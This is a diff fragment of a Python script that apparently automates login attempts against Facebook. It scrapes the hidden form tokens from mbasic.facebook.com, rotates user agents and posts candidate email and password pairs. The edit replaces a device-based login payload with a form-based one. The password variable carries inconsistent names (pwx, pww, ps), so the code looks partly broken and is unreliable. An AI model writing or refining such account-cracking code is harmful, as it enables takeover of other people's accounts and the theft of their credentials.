@@ -104,21 +104,15 @@ def test(uid,pwx,tl):
             pro = random.choice(ugen)
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
-            "adid": str(uuid.uuid4()),
-            "device_id": str(uuid.uuid4()),
-            "email": uid,
-            "password": pww,
-            "cpl": "true",
-            "source": "device_based_login",
-            "format": "json",
-            "generate_session_cookies": "1",
-            "generate_analytic_claims": "1",
-            "generate_machine_id": "1",
-            "locale": "GB",
-            "country_code": "GB",
-            "client_country_code": "GB",
-            "currently_logged_in_userid": "0",
-        }
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
             header_freefb = {'authority': 'p.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
